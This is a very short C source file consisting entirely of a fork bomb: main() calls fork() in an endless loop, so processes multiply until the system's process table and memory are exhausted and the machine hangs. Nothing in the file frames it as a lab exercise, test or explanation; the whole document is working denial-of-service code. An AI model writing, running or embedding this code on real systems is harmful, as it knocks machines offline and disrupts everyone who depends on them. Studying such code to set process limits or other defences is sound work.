#include <unistd.h>
int main(){
	for (;;){
		fork();
	}
}
